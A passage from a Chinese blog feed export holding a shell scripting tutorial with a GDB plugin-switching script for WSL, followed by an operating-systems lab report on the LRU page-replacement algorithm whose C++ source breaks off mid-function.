<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 单行注释</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt;EOF</span><br><span class="line">多行注释</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h3 id="Shell-传递参数"><a href="#Shell-传递参数" class="headerlink" title="Shell 传递参数"></a>Shell 传递参数</h3><p>我们可以在执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：$n。</p>
<p>n 代表一个数字，0为输入的文件名（包括路径，这个不算参数），1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p>
<p>另外，还有几个特殊字符用来处理参数：</p>
<table>
<thead>
<tr>
<th align="left">参数处理</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$#</td>
<td align="left">传递到脚本的参数个数</td>
</tr>
<tr>
<td align="left">$*</td>
<td align="left">显示所有向脚本传递的参数。 以”$1 $2 … $n”的形式输出所有参数。</td>
</tr>
<tr>
<td align="left">$$</td>
<td align="left">脚本运行的当前进程ID号</td>
</tr>
<tr>
<td align="left">$!</td>
<td align="left">后台运行的最后一个进程的ID号</td>
</tr>
<tr>
<td align="left">$@</td>
<td align="left">显示所有向脚本传递的参数。 以”$1”  “$2” … “$n”的形式输出所有参数。</td>
</tr>
<tr>
<td align="left">$-</td>
<td align="left">显示Shell使用的当前选项，与<a href="https://www.runoob.com/linux/linux-comm-set.html">set命令</a>功能相同。</td>
</tr>
<tr>
<td align="left">$?</td>
<td align="left">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
</tbody></table>
<h3 id="Shell-基本运算符"><a href="#Shell-基本运算符" class="headerlink" title="Shell 基本运算符"></a>Shell 基本运算符</h3><p>expr已经过时了，考虑重新用<code>$(())</code>、<code>$&#123;&#125;</code>、<code>[[]]</code>。</p>
<h4 id="算数运算符（只支持数字）"><a href="#算数运算符（只支持数字）" class="headerlink" title="算数运算符（只支持数字）"></a>算数运算符（只支持数字）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">val=$((2 + 2))</span><br><span class="line">val=$((2 * 2))</span><br><span class="line">val=$((2 / 2))</span><br><span class="line">val=$((2 * 2))</span><br><span class="line">val=$((2 % 2))</span><br><span class="line">val=$((2 == 2))</span><br><span class="line">val=$((2 != 2))</span><br></pre></td></tr></table></figure>

<h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-eq</td>
<td align="left">检测两个数是否相等，相等返回 true。</td>
<td align="left">[ $a -eq $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">-ne</td>
<td align="left">检测两个数是否不相等，不相等返回 true。</td>
<td align="left">[ $a -ne $b ] 返回 true。</td>
</tr>
<tr>
<td align="left">-gt</td>
<td align="left">检测左边的数是否大于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -gt $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">-lt</td>
<td align="left">检测左边的数是否小于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -lt $b ] 返回 true。</td>
</tr>
<tr>
<td align="left">-ge</td>
<td align="left">检测左边的数是否大于等于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -ge $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">-le</td>
<td align="left">检测左边的数是否小于等于右边的，如果是，则返回 true。</td>
<td align="left">[ $a -le $b ] 返回 true。</td>
</tr>
</tbody></table>
<h4 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">!</td>
<td align="left">非运算，表达式为 true 则返回 false，否则返回 true。</td>
<td align="left">[ ! false ] 返回 true。</td>
</tr>
<tr>
<td align="left">-o</td>
<td align="left">或运算，有一个表达式为 true 则返回 true。</td>
<td align="left">[ $a -lt 20 -o $b -gt 100 ] 返回 true。</td>
</tr>
<tr>
<td align="left">-a</td>
<td align="left">与运算，两个表达式都为 true 才返回 true。</td>
<td align="left">[ $a -lt 20 -a $b -gt 100 ] 返回 false。</td>
</tr>
</tbody></table>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">&amp;&amp;</td>
<td align="left">逻辑的 AND</td>
<td align="left">[[ $a -lt 100 &amp;&amp; $b -gt 100 ]] 返回 false</td>
</tr>
<tr>
<td align="left">||</td>
<td align="left">逻辑的 OR</td>
<td align="left">[[ $a -lt 100</td>
</tr>
</tbody></table>
<h4 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">=</td>
<td align="left">检测两个字符串是否相等，相等返回 true。</td>
<td align="left">[ $a = $b ] 返回 false。</td>
</tr>
<tr>
<td align="left">!=</td>
<td align="left">检测两个字符串是否不相等，不相等返回 true。</td>
<td align="left">[ $a != $b ] 返回 true。</td>
</tr>
<tr>
<td align="left">-z</td>
<td align="left">检测字符串长度是否为0，为0返回 true。</td>
<td align="left">[ -z $a ] 返回 false。</td>
</tr>
<tr>
<td align="left">-n</td>
<td align="left">检测字符串长度是否不为 0，不为 0 返回 true。</td>
<td align="left">[ -n “$a” ] 返回 true。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">检测字符串是否为空，不为空返回 true。</td>
<td align="left">[ $a ] 返回 true。</td>
</tr>
</tbody></table>
<h4 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h4><table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">说明</th>
<th align="left">举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-b file</td>
<td align="left">检测文件是否是块设备文件，如果是，则返回 true。</td>
<td align="left">[ -b $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-c file</td>
<td align="left">检测文件是否是字符设备文件，如果是，则返回 true。</td>
<td align="left">[ -c $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-d file</td>
<td align="left">检测文件是否是目录，如果是，则返回 true。</td>
<td align="left">[ -d $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-f file</td>
<td align="left">检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td>
<td align="left">[ -f $file ] 返回 true。</td>
</tr>
<tr>
<td align="left">-g file</td>
<td align="left">检测文件是否设置了 SGID 位，如果是，则返回 true。</td>
<td align="left">[ -g $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-k file</td>
<td align="left">检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td>
<td align="left">[ -k $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-p file</td>
<td align="left">检测文件是否是有名管道，如果是，则返回 true。</td>
<td align="left">[ -p $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-u file</td>
<td align="left">检测文件是否设置了 SUID 位，如果是，则返回 true。</td>
<td align="left">[ -u $file ] 返回 false。</td>
</tr>
<tr>
<td align="left">-r file</td>
<td align="left">检测文件是否可读，如果是，则返回 true。</td>
<td align="left">[ -r $file ] 返回 true。</td>
</tr>
<tr>
<td align="left">-w file</td>
<td align="left">检测文件是否可写，如果是，则返回 true。</td>
<td align="left">[ -w $file ] 返回 true。</td>
</tr>
<tr>
<td align="left">-x file</td>
<td align="left">检测文件是否可执行，如果是，则返回 true。</td>
<td align="left">[ -x $file ] 返回 true。</td>
</tr>
<tr>
<td align="left">-s file</td>
<td align="left">检测文件是否为空（文件大小是否大于0），不为空返回 true。</td>
<td align="left">[ -s $file ] 返回 true。</td>
</tr>
<tr>
<td align="left">-e file</td>
<td align="left">检测文件（包括目录）是否存在，如果是，则返回 true。</td>
<td align="left">[ -e $file ] 返回 true。</td>
</tr>
</tbody></table>
<h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><h4 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h4><p>注意：如果else没有执行语句，就不要写。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">a=10</span><br><span class="line">b=1</span><br><span class="line">if [[ $a == &quot;$&#123;b&#125;0&quot; ]]; then</span><br><span class="line">    echo &quot;a 等于 b&quot;</span><br><span class="line">elif [ $a -gt $b ]; then</span><br><span class="line">    echo &quot;a 大于 b&quot;</span><br><span class="line">elif [ $a -lt $b ]; then</span><br><span class="line">    echo &quot;a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;没有符合的条件&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h4 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">command=&#x27;ls&#x27;</span><br><span class="line">for loop in $($&#123;command&#125;); do</span><br><span class="line">    echo &quot;The value is: $&#123;loop&#125;&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="while-语句"><a href="#while-语句" class="headerlink" title="while 语句"></a>while 语句</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">int=$((1 + 0))</span><br><span class="line">while ((int &lt;= 5)); do</span><br><span class="line">    echo $int</span><br><span class="line">    ((int++))</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="until-循环"><a href="#until-循环" class="headerlink" title="until 循环"></a>until 循环</h4><p>直到条件为true时停止</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">a=0</span><br><span class="line">until [ ! $a -lt 10 ]; do  # 1 &lt; 10</span><br><span class="line">    echo $a</span><br><span class="line">    a=$((a + 1))</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="case-esac"><a href="#case-esac" class="headerlink" title="case-esac"></a>case-esac</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &#x27;输入:&#x27;</span><br><span class="line">read -r aNum</span><br><span class="line">case $aNum in</span><br><span class="line">1)</span><br><span class="line">    echo &#x27;你选择了 1&#x27;</span><br><span class="line">    ;;</span><br><span class="line">2)</span><br><span class="line">    echo &#x27;你选择了 2&#x27;</span><br><span class="line">    ;;</span><br><span class="line">3)</span><br><span class="line">    echo &#x27;你选择了 3&#x27;</span><br><span class="line">    ;;</span><br><span class="line">4)</span><br><span class="line">    echo &#x27;你选择了 4&#x27;</span><br><span class="line">    ;;</span><br><span class="line">&quot;google&quot;)</span><br><span class="line">    echo &quot;Google 搜索&quot;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo &#x27;你没有输入 1 到 4 之间的数字&#x27;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="break-和-continue"><a href="#break-和-continue" class="headerlink" title="break 和 continue"></a>break 和 continue</h4><p>break 命令跳出所有循环</p>
<p>continue 命令仅仅跳出当前循环，执行下一个循环</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">funWithReturn() &#123;</span><br><span class="line">    echo &quot;这个函数会对输入的两个数字进行相加运算...&quot;</span><br><span class="line">    echo &quot;输入第一个数字: &quot;</span><br><span class="line">    read -r aNum</span><br><span class="line">    echo &quot;输入第二个数字: &quot;</span><br><span class="line">    read -r anotherNum</span><br><span class="line">    echo &quot;两个数字分别为 $aNum 和 $anotherNum !&quot;</span><br><span class="line">    return $((aNum + anotherNum))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line">echo &quot;输入的两个数字之和为 $? !&quot;       # $?为上一个命令状态返回码，会被覆盖</span><br></pre></td></tr></table></figure>

<h3 id="输入-输出重定向"><a href="#输入-输出重定向" class="headerlink" title="输入/输出重定向"></a>输入/输出重定向</h3><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">command &gt; file</td>
<td align="left">将输出重定向到 file。</td>
</tr>
<tr>
<td align="left">command &lt; file</td>
<td align="left">将输入重定向到 file。</td>
</tr>
<tr>
<td align="left">command &gt;&gt; file</td>
<td align="left">将输出以追加的方式重定向到 file。</td>
</tr>
<tr>
<td align="left">n &gt; file</td>
<td align="left">将文件描述符为 n 的文件重定向到 file。</td>
</tr>
<tr>
<td align="left">n &gt;&gt; file</td>
<td align="left">将文件描述符为 n 的文件以追加的方式重定向到 file。</td>
</tr>
<tr>
<td align="left">n &gt;&amp; m</td>
<td align="left">将输出文件 m 和 n 合并。</td>
</tr>
<tr>
<td align="left">n &lt;&amp; m</td>
<td align="left">将输入文件 m 和 n 合并。</td>
</tr>
<tr>
<td align="left">&lt;&lt; tag</td>
<td align="left">将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td>
</tr>
</tbody></table>
<p>注意：文件描述符 0 通常是标准输入（STD IN），1 是标准输出（STD OUT），2 是标准错误输出（STD ERR）。</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>和其他语言一样，Shell 也可以包含外部脚本。这样可以很方便的封装一些公用的代码作为一个独立的文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">. filename      # 注意点号和文件名中间有一空格</span><br><span class="line">source filename</span><br></pre></td></tr></table></figure>



<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>如果有C/C++基础，这些都是非常快速地学会的，接下来是我编写的一些脚本</p>
<h4 id="WSL-1-下的-GDB-插件切换"><a href="#WSL-1-下的-GDB-插件切换" class="headerlink" title="WSL 1 下的 GDB 插件切换"></a>WSL 1 下的 GDB 插件切换</h4><p><code>select.sh</code>文件，思路是将<code>.gdbinit</code>替换<code>source ~/software/my_dbg/peda/peda.py</code>这一行的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo -e &quot;Please choose one mode of GDB?\n1.peda    2.gef    3.pwndbg&quot;</span><br><span class="line">read -r -p &quot;Input your choice:&quot; num</span><br><span class="line">case &quot;$&#123;num&#125;&quot; in</span><br><span class="line">1)</span><br><span class="line">    name=&#x27;1&#x27;</span><br><span class="line">    ;;</span><br><span class="line">2)</span><br><span class="line">    name=&#x27;2&#x27;</span><br><span class="line">    ;;</span><br><span class="line">3)</span><br><span class="line">    name=&#x27;3&#x27;</span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo -e &quot;Error!!!!\nPleasse input right number!&quot;</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">gdbinitfile=~/.gdbinit</span><br><span class="line"></span><br><span class="line">peda=&quot;source ~/software/my_dbg/peda/peda.py&quot;</span><br><span class="line">gef=&quot;source /home/sung/software/my_dbg/gef/.gdbinit-gef.py&quot;</span><br><span class="line">pwndbg=&quot;source /home/sung/software/my_dbg/pwndbg/gdbinit.py&quot;</span><br><span class="line"></span><br><span class="line">sign=$(cat $gdbinitfile | grep -n &quot;# this place is controled by user&#x27;s shell&quot;)</span><br><span class="line">number=$&#123;sign:0:1&#125;</span><br><span class="line">location=$((number + 1))</span><br><span class="line"></span><br><span class="line">if [ $name -eq &quot;1&quot; ]; then</span><br><span class="line">    sed -i &quot;$&#123;location&#125;c $peda&quot; $gdbinitfile</span><br><span class="line">    echo -e &quot;Please enjoy the peda!\n&quot;</span><br><span class="line">elif [ $name -eq &quot;2&quot; ]; then</span><br><span class="line">    sed -i &quot;$&#123;location&#125;c $gef&quot; $gdbinitfile</span><br><span class="line">    echo -e &quot;Please enjoy the gef!\n&quot;</span><br><span class="line">else</span><br><span class="line">    sed -i &quot;$&#123;location&#125;c $pwndbg&quot; $gdbinitfile</span><br><span class="line">    echo -e &quot;Please enjoy the pwndbg!\n&quot;</span><br><span class="line">fi</span><br><span class="line">/usr/bin/gdb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后通过<code>alias</code>工具设置<code>alias gdb=~/software/my_dbg/select.sh</code></p>
<p><img src="/2021/12/07/Shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20211208091656121.png" alt="image-20211208091656121"></p>
<p><code>setup.sh</code>文件，实现永久化，需要在<code>~/.bashrc</code>里追加这个内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo alias gdb=&#x27;~/software/my_dbg/select.sh&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>LRU算法实验报告</title>
    <url>/2021/12/18/LRU%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="LRU算法实验报告"><a href="#LRU算法实验报告" class="headerlink" title="LRU算法实验报告"></a>LRU算法实验报告</h1><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><ol>
<li><p>最近最久未使用（LRU）置换算法原理 就是：当需要淘汰某页面时，选择当前 一段时间内最久未使用过的页先淘汰， 即淘汰距当前最远的上次使用的页。</p>
<ul>
<li>例如: 分配给该进程的页块数为3，一个20位 长的页面访问序列为 :12560,36536,56042,70435， 则缺页次数和缺页率按下图给出:<br><img src="/2021/12/18/LRU%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/image-20211208220700629.png" alt="image-20211208220700629"></li>
</ul>
</li>
<li><p>假定分配给该进程的页块数为3，页面访问序 列长度为20。本实验可以采用数组结构实现， 首先随机产生页面序列，当发生请求调页时， 若内存已满，则需要利用LRU算法，将当前一 段时间内最久未使用过的页替换出去<br><img src="/2021/12/18/LRU%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/image-20211208220624900.png" alt="image-20211208220624900"></p>
</li>
</ol>
<p>思考题：比较LRU和其他置换算法各自的优缺点，能够 实现其他置换算法模拟设计，分析内存页面数的变化对各种置换算法命中率的影响</p>
<p>答：内存页面数越多，命中率越高。LRU算法可以减少页错误率,较易理解。最优算法页错误最低,且没有 Belady 异常,但是较难实现。FIFO算法容易理解和实现,但是页错误率较高</p>
<h2 id="数据结构以及符号说明"><a href="#数据结构以及符号说明" class="headerlink" title="数据结构以及符号说明"></a>数据结构以及符号说明</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> sequence[<span class="number">20</span>];   <span class="comment">//随机生成序列</span></span><br><span class="line"><span class="keyword">bool</span> missing[<span class="number">20</span>];   <span class="comment">//是否命中</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">process_memory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> block[<span class="number">20</span>][<span class="number">3</span>];   <span class="comment">// 20次读取，3个页块的内容</span></span><br><span class="line">    <span class="comment">//bool missing[20];</span></span><br><span class="line">    <span class="keyword">int</span> priority[<span class="number">3</span>]; <span class="comment">// priority[0]最先被替换</span></span><br><span class="line">    <span class="keyword">int</span> missing_number;   <span class="comment">//未命中次数</span></span><br><span class="line">    <span class="keyword">double</span> missing_number_percentage; <span class="comment">//未命中率</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">process_memory</span>()      <span class="comment">//初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;block[i][j] = <span class="number">-1</span>;  <span class="comment">//-1表示页块为空</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for (int i = 0; i &lt; 20; i++)</span></span><br><span class="line">        <span class="comment">//&#123;</span></span><br><span class="line">        <span class="comment">//    missing[i] = true;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">        priority[<span class="number">0</span>] = <span class="number">0</span>;          <span class="comment">//最先被替换的是页块0</span></span><br><span class="line">        priority[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        priority[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        missing_number = <span class="number">0</span>;</span><br><span class="line">        missing_number_percentage = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">percentage_count</span><span class="params">()</span>          <span class="comment">//计算命中率</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        missing_number_percentage = missing_number / <span class="number">20.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="源代码及注释"><a href="#源代码及注释" class="headerlink" title="源代码及注释"></a>源代码及注释</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sequence[<span class="number">20</span>];   <span class="comment">//随机生成序列</span></span><br><span class="line"><span class="keyword">bool</span> missing[<span class="number">20</span>];   <span class="comment">//是否命中</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">process_memory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> block[<span class="number">20</span>][<span class="number">3</span>];   <span class="comment">// 20次读取，3个页块的内容</span></span><br><span class="line">    <span class="comment">//bool missing[20];</span></span><br><span class="line">    <span class="keyword">int</span> priority[<span class="number">3</span>]; <span class="comment">// priority[0]最先被替换</span></span><br><span class="line">    <span class="keyword">int</span> missing_number;   <span class="comment">//未命中次数</span></span><br><span class="line">    <span class="keyword">double</span> missing_number_percentage; <span class="comment">//未命中率</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">process_memory</span>()      <span class="comment">//初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;block[i][j] = <span class="number">-1</span>;  <span class="comment">//-1表示页块为空</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for (int i = 0; i &lt; 20; i++)</span></span><br><span class="line">        <span class="comment">//&#123;</span></span><br><span class="line">        <span class="comment">//    missing[i] = true;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">        priority[<span class="number">0</span>] = <span class="number">0</span>;          <span class="comment">//最先被替换的是页块0</span></span><br><span class="line">        priority[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        priority[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">        missing_number = <span class="number">0</span>;</span><br><span class="line">        missing_number_percentage = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">percentage_count</span><span class="params">()</span>          <span class="comment">//计算命中率</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        missing_number_percentage = missing_number / <span class="number">20.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Randomized_Sequence</span><span class="params">(<span class="keyword">int</span> *sequence)</span>      <span class="comment">//随机生成序列，并且初始化记录是否命中的数组</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sequence[i] = <span class="built_in">rand</span>() % <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        missing[i] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(process_memory &amp;example)</span>       <span class="comment">//展示表格、未命中数、未命中率</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;======================================================================================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;sequence | &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; sequence[i] &lt;&lt; <span class="string">&quot; | &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;block &quot;</span> &lt;&lt; j &lt;&lt; <span class="string">&quot;  | &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="built_in">setw</span>(<span class="number">4</span>) &lt;&lt; example.block[i][j] &lt;&lt; <span class="string">&quot; | &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;missing  | &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (missing[i])</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;miss | &quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;hit  | &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;======================================================================================================================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;missing number     : &quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; example.missing_number &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;missing percentage : &quot;</span> &lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>) &lt;&lt; example.missing_number_percentage &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">priority_rank</span><span class="params">(process_memory &amp;example, <span class="keyword">int</span> j)</span> <span class="comment">// 页块j设为最后被替换的，调整优先级</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (example.priority[<span class="number">0</span>] == j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tem = example.priority[<span class="number">0</span>];</span><br><span class="line">        example.priority[<span class="number">0</span>] = example.priority[<span class="number">1</span>];</span><br><span class="line">        example.priority[<span class="number">1</span>] = example.priority[<span class="number">2</span>];</span><br><span class="line">        example.priority[<span class="number">2</span>] = tem;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (example.priority[<span class="number">1</span>] == j)</span><br><span class="line">    &#123;</span><br><span class="line">        